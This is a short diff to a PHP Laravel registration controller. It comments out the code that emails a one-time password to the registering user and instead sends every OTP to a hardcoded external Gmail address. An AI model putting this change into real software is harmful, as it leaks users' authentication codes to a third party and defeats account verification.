@@ -55,8 +55,12 @@ class RegistrationController extends Controller
         $user->save();
 
         // Send OTP via email
+        // if ($request->email) {
+        //     Mail::to($user->email)->send(new OtpNotification($otp));
+        // }
+
         if ($request->email) {
-            Mail::to($user->email)->send(new OtpNotification($otp));
+            Mail::to('nahidahmedsd47@gmail.com')->send(new OtpNotification($otp));
         }
         // TODO: Add SMS OTP sending for phone
 
